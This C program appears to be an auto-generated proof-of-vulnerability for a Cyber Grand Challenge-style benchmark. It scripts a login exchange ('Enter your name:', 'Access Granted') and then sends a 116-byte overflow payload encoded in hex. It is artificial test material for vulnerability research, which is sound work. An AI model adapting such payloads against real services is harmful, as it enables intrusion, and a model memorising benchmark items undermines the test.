#include <libpov.h>
int main(void) {
   negotiate_type1(0x0, 0x0, 0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x3a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x45\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x6e\x61\x6d\x65\x3a";
      read_00000_ptr += data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 16);
      free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x37\x31\x64\x62\x31\x30\x32\x36\x31\x63\x0a";
      static unsigned int write_00000_00000_len = 11;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 1);
      if (read_00001_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00001_00000[] = 
         "\x48\x65\x6c\x6c\x6f\x2c\x20\x37\x31\x64\x62\x31\x30\x32\x36\x31"
         "\x63\x21\x0a";
      read_00001_ptr += data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 19);
      free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 1);
      if (read_00002_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00002_00000[] = 
         "\x41\x63\x63\x65\x73\x73\x20\x47\x72\x61\x6e\x74\x65\x64";
      read_00002_ptr += data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 14);
      free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x70\x00\x00\x00\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60"
         "\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60"
         "\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60"
         "\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60"
         "\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60"
         "\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60"
         "\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60"
         "\x60\x60\x60\x60";
      static unsigned int write_00001_00000_len = 116;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         transmit_all(1, write_00001, write_00001_len);
      }
      free(write_00001);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length read
      read_00003_len = 10;
      read_00003 = (unsigned char*)malloc(read_00003_len);
      int read_00003_res = length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning
      free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
}
